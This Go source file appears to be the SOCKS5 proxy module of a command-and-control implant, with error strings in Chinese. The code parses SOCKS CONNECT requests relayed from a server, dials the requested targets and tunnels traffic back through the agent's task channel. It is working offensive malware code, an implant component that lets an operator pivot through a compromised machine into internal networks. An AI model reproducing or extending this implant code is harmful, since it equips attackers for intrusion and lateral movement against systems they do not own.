package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
)

type socksConnection struct {
	serverID    int
	conn        net.Conn
	connectSent bool
}

type socksRegistry struct {
	owner  *AgentController
	mu     sync.RWMutex
	active bool
	conns  map[int]*socksConnection
}

func newSocksRegistry(owner *AgentController) *socksRegistry {
	return &socksRegistry{
		owner: owner,
		conns: make(map[int]*socksConnection),
	}
}

func (r *socksRegistry) Enable() {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.active = true
}

func (r *socksRegistry) Disable() {
	r.mu.Lock()
	connections := r.snapshotLocked()
	r.active = false
	r.conns = make(map[int]*socksConnection)
	r.mu.Unlock()
	for _, connection := range connections {
		r.owner.enqueueSocksOutput(connection.serverID, nil, true)
		_ = connection.conn.Close()
	}
}

func (r *socksRegistry) Handle(message SocksMessage) error {
	if !runtimeConfig.SocksEnabled {
		return fmt.Errorf("payload 未启用 socks 能力")
	}
	r.mu.RLock()
	active := r.active
	connection, found := r.conns[message.ServerID]
	r.mu.RUnlock()
	if !active {
		return fmt.Errorf("socks 尚未启动")
	}

	data, err := base64.StdEncoding.DecodeString(message.Data)
	if err != nil && message.Data != "" {
		return fmt.Errorf("解析 socks 数据失败: %w", err)
	}
	if found {
		return r.handleExistingConnection(connection, data, message.Exit)
	}
	return r.handleNewConnection(message.ServerID, data, message.Exit)
}

func (r *socksRegistry) handleExistingConnection(connection *socksConnection, data []byte, exit bool) error {
	if len(data) > 0 && connection.conn == nil {
		return r.handleHandshakeOrConnect(connection, data)
	}
	if len(data) > 0 {
		log.Printf("[socks] server_id=%d write_to_target bytes=%d", connection.serverID, len(data))
		if _, err := connection.conn.Write(data); err != nil {
			r.remove(connection.serverID)
			if connection.conn != nil {
				_ = connection.conn.Close()
			}
			r.owner.enqueueSocksOutput(connection.serverID, nil, true)
			return fmt.Errorf("写入 socks 连接失败: %w", err)
		}
	}
	if exit {
		r.remove(connection.serverID)
		if connection.conn != nil {
			_ = connection.conn.Close()
		}
		r.owner.enqueueSocksOutput(connection.serverID, nil, true)
	}
	return nil
}

func (r *socksRegistry) handleNewConnection(serverID int, data []byte, exit bool) error {
	if exit {
		return nil
	}
	connection := &socksConnection{serverID: serverID}
	r.mu.Lock()
	r.conns[serverID] = connection
	r.mu.Unlock()
	if err := r.handleHandshakeOrConnect(connection, data); err != nil {
		r.remove(serverID)
		r.owner.enqueueSocksOutput(serverID, buildSocksReply(0x01), true)
		return err
	}
	return nil
}

func (r *socksRegistry) readLoop(connection *socksConnection) {
	buffer := make([]byte, 4096)
	for {
		n, err := connection.conn.Read(buffer)
		if n > 0 {
			log.Printf("[socks] server_id=%d read_from_target bytes=%d", connection.serverID, n)
			chunk := append([]byte(nil), buffer[:n]...)
			r.owner.enqueueSocksOutput(connection.serverID, chunk, false)
		}
		if err != nil {
			r.remove(connection.serverID)
			if connection.conn != nil {
				_ = connection.conn.Close()
			}
			r.owner.enqueueSocksOutput(connection.serverID, nil, true)
			return
		}
	}
}

func (r *socksRegistry) handleHandshakeOrConnect(connection *socksConnection, data []byte) error {
	targetAddress, reply, err := parseSocksConnectRequest(data)
	if err != nil {
		return err
	}
	log.Printf("[socks] server_id=%d connect_request bytes=%d target=%s", connection.serverID, len(data), targetAddress)
	conn, err := net.Dial("tcp", targetAddress)
	if err != nil {
		r.owner.enqueueSocksOutput(connection.serverID, buildSocksReply(0x05), true)
		return fmt.Errorf("连接 socks 目标失败: %w", err)
	}
	connection.conn = conn
	connection.connectSent = true
	if len(reply) == 0 {
		reply = buildSocksReply(0x00)
	}
	log.Printf("[socks] server_id=%d connect_ok reply_bytes=%d", connection.serverID, len(reply))
	r.owner.enqueueSocksOutput(connection.serverID, reply, false)
	go r.readLoop(connection)
	return nil
}

func (r *socksRegistry) remove(serverID int) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.conns, serverID)
}

func (r *socksRegistry) snapshotLocked() []*socksConnection {
	connections := make([]*socksConnection, 0, len(r.conns))
	for _, connection := range r.conns {
		connections = append(connections, connection)
	}
	return connections
}

func (r *socksRegistry) HasActiveSessions() bool {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.active
}

func parseSocksConnectRequest(data []byte) (string, []byte, error) {
	if len(data) < 4 {
		return "", nil, fmt.Errorf("SOCKS 请求长度不足")
	}
	reader := bytes.NewReader(data)
	firstByte, _ := reader.ReadByte()
	switch firstByte {
	case 0x05:
		command, _ := reader.ReadByte()
		_, _ = reader.ReadByte()
		atyp, _ := reader.ReadByte()
		if command != 0x01 {
			return "", nil, fmt.Errorf("仅支持 SOCKS CONNECT")
		}
		targetAddress, err := parseSocksTarget(reader, atyp)
		if err != nil {
			return "", nil, err
		}
		return targetAddress, buildSocksReply(0x00), nil
	default:
		return "", nil, fmt.Errorf("不支持的 SOCKS 版本: %d", firstByte)
	}
}

func parseSocksHost(reader *bytes.Reader, atyp byte) (string, error) {
	switch atyp {
	case 0x01:
		addr := make([]byte, 4)
		if _, err := io.ReadFull(reader, addr); err != nil {
			return "", err
		}
		return net.IP(addr).String(), nil
	case 0x03:
		length, err := reader.ReadByte()
		if err != nil {
			return "", err
		}
		addr := make([]byte, length)
		if _, err := io.ReadFull(reader, addr); err != nil {
			return "", err
		}
		return string(addr), nil
	case 0x04:
		addr := make([]byte, 16)
		if _, err := io.ReadFull(reader, addr); err != nil {
			return "", err
		}
		return net.IP(addr).String(), nil
	default:
		return "", fmt.Errorf("不支持的 SOCKS ATYP: %d", atyp)
	}
}

func parseSocksTarget(reader *bytes.Reader, atyp byte) (string, error) {
	host, err := parseSocksHost(reader, atyp)
	if err != nil {
		return "", err
	}
	var port uint16
	if err := binary.Read(reader, binary.BigEndian, &port); err != nil {
		return "", fmt.Errorf("解析 SOCKS 端口失败: %w", err)
	}
	return net.JoinHostPort(host, fmt.Sprintf("%d", port)), nil
}

func buildSocksReply(status byte) []byte {
	return []byte{0x05, status, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
}

func (c *AgentController) executeSocksStart(task Task) TaskResponse {
	if !runtimeConfig.SocksEnabled {
		return TaskResponse{TaskID: task.ID, UserOutput: "错误: 当前 payload 未启用 socks 能力", Completed: true, Status: "error: socks disabled"}
	}
	c.socks.Enable()
	return TaskResponse{TaskID: task.ID, UserOutput: "SOCKS 代理通道已启用", Completed: true, Status: "success"}
}

func (c *AgentController) executeSocksStop(task Task) TaskResponse {
	c.socks.Disable()
	return TaskResponse{TaskID: task.ID, UserOutput: "SOCKS 代理通道已关闭", Completed: true, Status: "success"}
}

func normalizeProxyAuth(value string) string {
	return strings.TrimSpace(value)
}
